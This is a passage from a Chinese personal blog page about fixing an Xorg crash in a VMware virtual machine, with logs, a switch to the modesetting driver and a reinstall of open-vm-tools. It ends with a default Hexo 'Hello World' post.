<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">╰─&gt;[👾]~ $ <span class="built_in">sudo</span> journalctl -u sddm.service -n 50</span><br><span class="line">5月 27 15:20:04 Athena systemd[1]: Started Simple Desktop Display Manager.</span><br><span class="line">5月 27 15:20:04 Athena sddm[610]: Initializing...</span><br><span class="line">5月 27 15:20:04 Athena sddm[610]: Starting...</span><br><span class="line">5月 27 15:20:04 Athena sddm[610]: Logind interface found</span><br><span class="line">5月 27 15:20:04 Athena sddm[610]: Adding new display...</span><br><span class="line">5月 27 15:20:04 Athena sddm[610]: Loaded empty theme configuration</span><br><span class="line">5月 27 15:20:04 Athena sddm[610]: Xauthority path: <span class="string">&quot;/run/sddm/xauth_oLQvgT&quot;</span></span><br><span class="line">5月 27 15:20:04 Athena sddm[610]: Using VT 2</span><br><span class="line">5月 27 15:20:04 Athena sddm[610]: Display server starting...</span><br><span class="line">5月 27 15:20:04 Athena sddm[610]: Writing cookie to <span class="string">&quot;/run/sddm/xauth_oLQvgT&quot;</span></span><br><span class="line">5月 27 15:20:04 Athena sddm[610]: Running: /usr/bin/X -nolisten tcp -background none -seat seat0 vt2 -auth /run/sddm/xauth_oLQvgT -noreset -displayfd 16</span><br><span class="line">5月 27 15:20:06 Athena systemd-coredump[648]: [🡕] Process 620 (Xorg) of user 0 dumped core.</span><br><span class="line">                                               </span><br><span class="line">                                               Stack trace of thread 620:</span><br><span class="line">                                               <span class="comment">#0  0x00007f20e31d974c n/a (libc.so.6 + 0x9774c)</span></span><br><span class="line">                                               <span class="comment">#1  0x00007f20e317fdc0 raise (libc.so.6 + 0x3ddc0)</span></span><br><span class="line">                                               <span class="comment">#2  0x00007f20e316757a abort (libc.so.6 + 0x2557a)</span></span><br><span class="line">                                               <span class="comment">#3  0x00005566d1994b3e OsAbort (/usr/lib/Xorg + 0x153b3e)</span></span><br><span class="line">                                               <span class="comment">#4  0x00005566d1996037 FatalError (/usr/lib/Xorg + 0x155037)</span></span><br><span class="line">                                               <span class="comment">#5  0x00005566d199cfd8 n/a (/usr/lib/Xorg + 0x15bfd8)</span></span><br><span class="line">                                               <span class="comment">#6  0x00007f20e317fef0 n/a (libc.so.6 + 0x3def0)</span></span><br><span class="line">                                               <span class="comment">#7  0x00007f20e32c7849 n/a (libc.so.6 + 0x185849)</span></span><br><span class="line">                                               <span class="comment">#8  0x00007f20e37b9694 n/a (vmware_drv.so + 0xb694)</span></span><br><span class="line">                                               <span class="comment">#9  0x00005566d18b5c4b AddScreen (/usr/lib/Xorg + 0x74c4b)</span></span><br><span class="line">                                               <span class="comment">#10 0x00005566d19ba15d InitOutput (/usr/lib/Xorg + 0x17915d)</span></span><br><span class="line">                                               <span class="comment">#11 0x00005566d1873c69 n/a (/usr/lib/Xorg + 0x32c69)</span></span><br><span class="line">                                               <span class="comment">#12 0x00007f20e31696b5 n/a (libc.so.6 + 0x276b5)</span></span><br><span class="line">                                               <span class="comment">#13 0x00007f20e3169769 __libc_start_main (libc.so.6 + 0x27769)</span></span><br><span class="line">                                               <span class="comment">#14 0x00005566d18752b5 _start (/usr/lib/Xorg + 0x342b5)</span></span><br><span class="line">                                               ELF object binary architecture: AMD x86-64</span><br><span class="line">5月 27 15:20:06 Athena sddm[610]: Failed to <span class="built_in">read</span> display number from pipe</span><br><span class="line">5月 27 15:20:06 Athena sddm[610]: Display server stopping...</span><br><span class="line">5月 27 15:20:06 Athena sddm[610]: Attempt 1 starting the Display server on vt 2 failed</span><br><span class="line">5月 27 15:20:08 Athena sddm[610]: Display server starting...</span><br><span class="line">5月 27 15:20:08 Athena sddm[610]: Writing cookie to <span class="string">&quot;/run/sddm/xauth_oLQvgT&quot;</span></span><br><span class="line">。。。</span><br><span class="line">。。。</span><br><span class="line">。。。</span><br><span class="line">5月 27 15:20:14 Athena sddm[610]: Failed to <span class="built_in">read</span> display number from pipe</span><br><span class="line">5月 27 15:20:14 Athena sddm[610]: Display server stopping...</span><br><span class="line">5月 27 15:20:14 Athena sddm[610]: Attempt 3 starting the Display server on vt 2 failed</span><br><span class="line">5月 27 15:20:14 Athena sddm[610]: Could not start Display server on vt 2</span><br><span class="line">5月 27 15:22:04 Athena sddm[610]: Signal received: SIGTERM</span><br><span class="line">5月 27 15:22:04 Athena systemd[1]: Stopping Simple Desktop Display Manager...</span><br><span class="line">5月 27 15:22:04 Athena systemd[1]: sddm.service: Deactivated successfully.</span><br><span class="line">5月 27 15:22:04 Athena systemd[1]: Stopped Simple Desktop Display Manager.</span><br><span class="line">5月 27 15:22:04 Athena systemd[1]: sddm.service: Consumed 5.537s CPU <span class="keyword">time</span>, 17.1M memory peak.</span><br></pre></td></tr></table></figure>

<p>这里测试一下Xorg能不能单独运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">╰─&gt;[👾]~ $ startx</span><br><span class="line">xauth:  file /home/xxx/.Xauthority does not exist</span><br><span class="line">xauth:  file /home/xxx/.Xauthority does not exist</span><br><span class="line">^C^C</span><br><span class="line">/usr/lib/Xorg.wrap: Only console <span class="built_in">users</span> are allowed to run the X server</span><br><span class="line">xinit: giving up</span><br><span class="line">xinit: unable to connect to X server: Connection refused</span><br><span class="line">xinit: server error</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">╰─&gt;[👾]~ $ <span class="built_in">sudo</span> Xorg -retro</span><br><span class="line"></span><br><span class="line">X.Org X Server 1.21.1.16</span><br><span class="line">X Protocol Version 11, Revision 0</span><br><span class="line">Current Operating System: Linux Athena 6.14.7-arch2-1 <span class="comment">#1 SMP PREEMPT_DYNAMIC Thu, 22 May 2025 05:37:49 +0000 x86_64</span></span><br><span class="line">Kernel <span class="built_in">command</span> line: BOOT_IMAGE=/vmlinuz-linux root=UUID=35dfce14-7d79-45a1-bee0-4081dfa4543a rw rootflags=subvol=@ loglevel=3 audit=0 nvme_load=<span class="built_in">yes</span> zswap.enabled=0 fbcon=nodefer nowatchdog systemd.unit=multi-user.target nomodeset</span><br><span class="line"> </span><br><span class="line">Current version of pixman: 0.46.0</span><br><span class="line">        Before reporting problems, check http://wiki.x.org</span><br><span class="line">        to make sure that you have the latest version.</span><br><span class="line">Markers: (--) probed, (**) from config file, (==) default setting,</span><br><span class="line">        (++) from <span class="built_in">command</span> line, (!!) notice, (II) informational,</span><br><span class="line">        (WW) warning, (EE) error, (NI) not implemented, (??) unknown.</span><br><span class="line">(==) Log file: <span class="string">&quot;/var/log/Xorg.0.log&quot;</span>, Time: Tue May 27 16:25:42 2025</span><br><span class="line">(==) Using config directory: <span class="string">&quot;/etc/X11/xorg.conf.d&quot;</span></span><br><span class="line">(==) Using system config directory <span class="string">&quot;/usr/share/X11/xorg.conf.d&quot;</span></span><br><span class="line">(EE) </span><br><span class="line">(EE) Backtrace:</span><br><span class="line">(EE) unw_get_proc_name failed: no unwind info found [-10]</span><br><span class="line">(EE) 0: /usr/lib/Xorg (?+0x0) [0x55d9c137ef7c]</span><br><span class="line">(EE) unw_get_proc_name failed: no unwind info found [-10]</span><br><span class="line">(EE) 1: /usr/lib/libc.so.6 (?+0x0) [0x7f1d01ad7ef0]</span><br><span class="line">(EE) unw_get_proc_name failed: no unwind info found [-10]</span><br><span class="line">(EE) 2: /usr/lib/libc.so.6 (?+0x0) [0x7f1d01c1f849]</span><br><span class="line">(EE) unw_get_proc_name failed: no unwind info found [-10]</span><br><span class="line">(EE) 3: /usr/lib/xorg/modules/drivers/vmware_drv.so (?+0x0) [0x7f1d02111694]</span><br><span class="line">(EE) 4: /usr/lib/Xorg (AddScreen+0x11b) [0x55d9c1297c4b]</span><br><span class="line">(EE) 5: /usr/lib/Xorg (InitOutput+0x3bd) [0x55d9c139c15d]</span><br><span class="line">(EE) unw_get_proc_name failed: no unwind info found [-10]</span><br><span class="line">(EE) 6: /usr/lib/Xorg (?+0x0) [0x55d9c1255c69]</span><br><span class="line">(EE) unw_get_proc_name failed: no unwind info found [-10]</span><br><span class="line">(EE) 7: /usr/lib/libc.so.6 (?+0x0) [0x7f1d01ac16b5]</span><br><span class="line">(EE) 8: /usr/lib/libc.so.6 (__libc_start_main+0x89) [0x7f1d01ac1769]</span><br><span class="line">(EE) 9: /usr/lib/Xorg (_start+0x25) [0x55d9c12572b5]</span><br><span class="line">(EE) </span><br><span class="line">(EE) Segmentation fault at address 0x0</span><br><span class="line">(EE) </span><br><span class="line">Fatal server error:</span><br><span class="line">(EE) Caught signal 11 (Segmentation fault). Server aborting</span><br><span class="line">(EE) </span><br><span class="line">(EE) </span><br><span class="line">Please consult the The X.Org Foundation support </span><br><span class="line">         at http://wiki.x.org</span><br><span class="line"> <span class="keyword">for</span> <span class="built_in">help</span>. </span><br><span class="line">(EE) Please also check the <span class="built_in">log</span> file at <span class="string">&quot;/var/log/Xorg.0.log&quot;</span> <span class="keyword">for</span> additional information.</span><br><span class="line">(EE) </span><br><span class="line">(EE) Server terminated with error (1). Closing <span class="built_in">log</span> file.</span><br><span class="line">已中止</span><br></pre></td></tr></table></figure>
<p>真是tmd事多呀</p>
<p>看下显卡</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">╰─&gt;[👾]~ $ lspci -k | grep -EA3 <span class="string">&#x27;(VGA|3D)&#x27;</span></span><br><span class="line">00:0f.0 VGA compatible controller: VMware SVGA II Adapter</span><br><span class="line">        Subsystem: VMware SVGA II Adapter</span><br><span class="line">        Kernel modules: vmwgfx</span><br><span class="line">00:10.0 SCSI storage controller: Broadcom / LSI 53c1030 PCI-X Fusion-MPT Dual Ultra320 SCSI (rev 01)</span><br><span class="line">        Subsystem: VMware LSI Logic Parallel SCSI Controller (emulated)</span><br></pre></td></tr></table></figure>

<p>从上面的sddm日志里看，Xorg 在加载 vmware_drv.so 时又崩溃了（Segfault），导致 SDDM 一直重试启动 Xorg 也失败。</p>
<p>如果想进入图形化界面，可以绕过出现问题的VMware驱动，改用内核自带的modesetting驱动（来自gpt）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 安装备用驱动包</span></span><br><span class="line"><span class="comment"># 确保已经安装了 fbdev/vesa 作为备胎（虽然真正启用的是 modesetting）：</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> pacman -S xf86-video-fbdev xf86-video-vesa</span><br><span class="line"><span class="comment"># 2. 删除可能残留的 VMware X 驱动配置</span></span><br><span class="line"><span class="comment"># 把任何强制加载 vmware_drv 的配置都删掉：</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> -f /etc/X11/xorg.conf.d/20-vmware.conf \</span><br><span class="line">           /usr/share/X11/xorg.conf.d/20-vmware.conf</span><br><span class="line"><span class="comment"># 3. 强制让 Xorg 只用 modesetting</span></span><br><span class="line"><span class="comment"># 在 /etc/X11/xorg.conf.d/ 下新建一个配置文件：</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p /etc/X11/xorg.conf.d</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/X11/xorg.conf.d/10-modesetting.conf &gt; /dev/null &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">Section <span class="string">&quot;Device&quot;</span></span><br><span class="line">    Identifier <span class="string">&quot;PrimaryGPU&quot;</span></span><br><span class="line">    Driver <span class="string">&quot;modesetting&quot;</span></span><br><span class="line">EndSection</span><br><span class="line">EOF</span><br><span class="line"><span class="comment"># 这会告诉 Xorg 不再尝试加载 vmware 驱动，而直接使用内核的 KMS modesetting。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 重启并验证</span></span><br><span class="line"><span class="comment"># 重新启动 SDDM：</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> systemctl restart sddm</span><br></pre></td></tr></table></figure>
<p>然后就会看到图形化界面<br><img src="/images/athena-9.png"><br>但是小巧可爱</p>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>保险起见，我先把Athena挂起，然后修复一下vmware<br><img src="/images/athena-10.png"><br>没有作用的话就是个心里安慰吧</p>
<p>重启之后打开Athena，重新安装一下VMware的X驱动看会不会报错</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">╰─&gt;[👾]~ $ <span class="built_in">sudo</span> pacman -Syu xf86-video-vmware open-vm-tools open-vm-tools-desktop</span><br><span class="line">:: 正在同步软件包数据库...</span><br><span class="line"> athena 已经是最新版本</span><br><span class="line"> core 已经是最新版本</span><br><span class="line"> extra 已经是最新版本</span><br><span class="line"> multilib 已经是最新版本</span><br><span class="line"> chaotic-aur 已经是最新版本</span><br><span class="line">警告：xf86-video-vmware-13.4.0-4 已经为最新 -- 重新安装</span><br><span class="line">警告：open-vm-tools-6:12.5.2-2 已经为最新 -- 重新安装</span><br><span class="line">错误：未找到目标：open-vm-tools-desktop</span><br></pre></td></tr></table></figure>
<p>重新装一下open-vm-tools，我是参考<a target="_blank" rel="noopener" href="https://wiki.archlinuxcn.org/zh-sg/VMware/%E5%AE%89%E8%A3%85_Arch_Linux_%E4%B8%BA%E8%99%9A%E6%8B%9F%E6%9C%BA">arch linux cn</a>中给的办法进行的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S open-vm-tools</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在内核中加上驱动程序</span></span><br><span class="line"><span class="built_in">sudo</span> vim /etc/mkinitcpio.conf</span><br><span class="line"></span><br><span class="line">MODULES=(... vmw_balloon vmw_pvscsi vsock vmw_vsock_vmci_transport ...)</span><br><span class="line"><span class="comment"># 一般是在上面</span></span><br><span class="line">esc :wq</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> systemctl start vmtoolsd.service vmware-vmblock-fuse.service</span><br></pre></td></tr></table></figure>
<p>然后大胆重启</p>
<p><img src="/images/athena-11.png"><br>成功修好了，但是总感觉不对你知道吧，就是这应该是进行aegis-tui之后的，但是修复进去完全没看到他的影子。。。<br>大不了再进行一下试试</p>
<p>试过了，可以正常使用了，该下啥下啥吧</p>

    
    
  </div>

  

  

</article>
  
  <article class="post">
  <header class="post-header">
    <h1 class="post-title">
      
      <a class="post-link" href="/2025/06/13/hello-world/">Hello World</a>
      
    </h1>

    <div class="post-meta">
      <span class="post-time">
        2025-06-13
      </span>
      
      
      
    </div>
  </header>

  

  <div class="post-content">
    
    
    

    
    <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

    
    
  </div>

  

  

</article>
  
    
  <nav class="pagination">  
      
      <a class="prev" href="/">  
        <i class="iconfont icon-left"></i>  
        <span class="prev-text">Prev</span>  
      </a>  
      
      
  </nav>  
  

  
</section>
        </div>
          

      </div>
    </main>
    <footer id="footer" class="footer">
      <!-- Social Links -->

<div class="social-links">
  
  
  
  
  <a href="mailto:your@email.com" class="iconfont icon-email" title="email"></a>
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  <a target="_blank" rel="noopener" href="https://github.com/ahonn" class="iconfont icon-github" title="github"></a>
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  

  
  
  <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
  
</div>



<div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme -
    <a class="theme-link" target="_blank" rel="noopener" href="https://github.com/ahonn/hexo-theme-even">Even</a>
  </span>
  <span class="division">|</span>
  <span class="hosting-info">
    footer.hosting
  </span>

  <span class="copyright-year">
    <span>
      
      &copy;
      
      2015 - 2025      
    </span>

    <span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>

    <span class="author">n0nome</span>
  </span>

</div>
    </footer>
    <div class="back-to-top" id="back-to-top"> <i class="iconfont icon-up"></i> </div>
  </div>
    

  







<script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>



<script type="text/javascript" src="/lib/slideout/slideout.js"></script>



<script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>



  <script type="text/javascript" src="/js/src/even.js?v=3.0.0"></script>
</body>

</html>